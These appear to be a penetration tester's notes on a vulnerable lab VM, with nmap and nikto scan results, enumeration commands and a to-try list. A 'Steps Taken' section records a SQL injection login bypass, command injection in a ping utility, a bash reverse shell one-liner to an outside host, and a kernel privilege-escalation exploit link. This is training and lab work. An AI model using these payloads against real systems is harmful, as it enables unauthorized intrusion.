OS: CentOS / Linux 2.6.X

Web Technology: Apache/2.0.52

IP: 192.168.1.119

USERS:

CREDENTIALS:

#####################################################
Community Attack Vectors (To-Try List):

22 → SSH → Bruteforce User Creds

80 → HTTP → GoBuster → Manual Inspection → robots/.DS_STORE/svn/ → Bruteforce login page → php → POST and TRACE → APACHE Vuln → 

443 → HTTPS → GoBuster → Manual Inspection → robots/.DS_STORE/svn/ 

631 → IPP → 

657 → STATUS → 

3306 → MYSQL → 

#####################################################
NMAP RESULTS:
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.0.52 (CentOS)
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            654/udp   status
|_  100024  1            657/tcp   status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_ssl-date: 2022-04-11T07:16:49+00:00; +4h00m00s from scanner time.
|_http-server-header: Apache/2.0.52 (CentOS)
631/tcp  open  ipp      CUPS 1.1
|_http-title: 403 Forbidden
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
657/tcp  open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 08:00:27:E6:21:FB (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6


#####################################################
Steps Taken():
[+] index.php displays a login page
[+]HTTP Header X-Powered-By: PHP/4.3.9
[+]Attempting bruteforce attack w/ user Administrator
[+]PUT method allowed on port 631
[+]index.php authentication bypassed with True statement ['or '1=1]
[+]pingback utility is vulnerable to command injection
[+];bash -i >& /dev/tcp/192.168.1.101/443 0>&1
[+]reverse shell obtained as apache user
[+]kernel version 2.6.9 vulnerable to privEsc
[+]https://www.exploit-db.com/exploits/9542

#####################################################
Web Services Enumeration:  

[  +  NIKTO   ]

+ Server: Apache/2.0.52 (CentOS)
+ Retrieved x-powered-by header: PHP/4.3.9
+ Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 

+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /manual/images/: Directory indexing found.

[  +  WFUZZ  GOBUSTER  ]

FILES:   /   (Web Root)
/index.php            (Status: 200) [Size: 667]

DIRECTORIES:  /  (Web Root)
/manual               	(Status: 301) [Size: 315] [--> http://192.168.1.119/manual/]

#####################################################
OTHER:  
PHP/4.3.9

SUIDs/GUIDs
find / -perm -u=s -type f 2>/dev/null
/sbin/unix_chkpwd
/sbin/pam_timestamp_check
/sbin/pwdb_chkpwd
/usr/sbin/ccreds_validate
/usr/sbin/userhelper
/usr/sbin/userisdnctl
/usr/sbin/suexec
/usr/sbin/usernetctl
/usr/libexec/openssh/ssh-keysign
/usr/libexec/pt_chown
/usr/kerberos/bin/ksu
/usr/lib/squid/pam_auth
/usr/lib/squid/ncsa_auth
/usr/bin/chsh
/usr/bin/rcp
/usr/bin/sudo
/usr/bin/chage
/usr/bin/crontab
/usr/bin/rlogin
/usr/bin/rsh
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/lppasswd
/usr/bin/sg
/usr/bin/passwd
/bin/mount
/bin/traceroute6
/bin/traceroute
/bin/umount
/bin/ping6
/bin/ping
/bin/su

find / -perm -g=s -type f 2>/dev/null
/var/www/html/index.php
/var/www/html/pingit.php
/sbin/netreport
/usr/sbin/lockdev
/usr/sbin/sendmail.sendmail
/usr/sbin/utempter
/usr/bin/wall
/usr/bin/slocate
/usr/bin/lockfile
/usr/bin/write
/usr/bin/ssh-agent

#####################################################
Take Away Concepts

• when MySQL ports are open, start thinking about a wider scope of SQL injections
   ◇ when certain services take in a specific syntax, consider fuzzing those input fields with various types of syntactical strings
• when one exploit fails, move on to the next
• when nc fails, use bash
   ◇ its better to let the webserver convert inputs to its required format rather than stressing over what format to use
      ▪ when there is an input field, let the webserver do the work with formatting unless its necessary to try manual formats
